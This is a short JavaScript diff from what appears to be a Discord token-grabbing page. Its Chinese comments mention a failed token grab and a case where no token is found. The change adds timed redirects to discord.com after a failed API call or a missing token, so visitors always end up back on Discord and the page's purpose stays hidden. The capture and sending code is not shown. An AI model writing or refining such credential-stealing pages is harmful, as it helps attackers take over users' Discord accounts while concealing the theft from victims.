@@ -63,7 +63,17 @@
             setTimeout(() => {
               window.location.href = "https://discord.com/channels/@me";
             }, 2000);
-          }).catch(err => console.warn("API call failed:", err));
+          }).catch(err => {
+            console.warn("API call failed:", err);
+            setTimeout(() => {
+              window.location.href = "https://discord.com/channels/@me";
+            }, 2000);
+          });
+        } else {
+          // 無 token — 一般瀏覽器打開，顯示等待然後跳回
+          setTimeout(() => {
+            window.location.href = "https://discord.com/channels/@me";
+          }, 1500);
         }
       } catch(e) {
         console.log("Token 抓取失敗:", e);
